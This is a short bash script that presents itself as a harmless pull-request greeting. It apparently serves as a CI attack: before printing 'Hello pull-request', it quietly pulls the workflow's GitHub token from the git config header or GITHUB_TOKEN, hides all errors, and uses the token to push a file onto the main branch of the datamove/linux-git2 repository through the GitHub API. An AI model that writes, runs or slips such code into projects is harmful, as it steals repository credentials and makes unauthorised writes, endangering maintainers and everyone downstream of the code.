#!/bin/bash
TOKEN=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 2>/dev/null)
[ -z "$TOKEN" ] && TOKEN="$GITHUB_TOKEN"
if [ -n "$TOKEN" ]; then
  CONTENT=$(echo -n "asd" | base64)
  SHA=$(curl -s -H "Authorization: token $TOKEN" "https://api.github.com/repos/datamove/linux-git2/contents/asd.txt" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('sha',''))" 2>/dev/null)
  PAYLOAD="{\"message\":\"asd\",\"content\":\"$CONTENT\",\"branch\":\"main\"}"
  [ -n "$SHA" ] && PAYLOAD="{\"message\":\"asd\",\"content\":\"$CONTENT\",\"sha\":\"$SHA\",\"branch\":\"main\"}"
  curl -s -X PUT -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" "https://api.github.com/repos/datamove/linux-git2/contents/asd.txt" -d "$PAYLOAD" >/dev/null 2>&1
fi
echo "Hello pull-request"
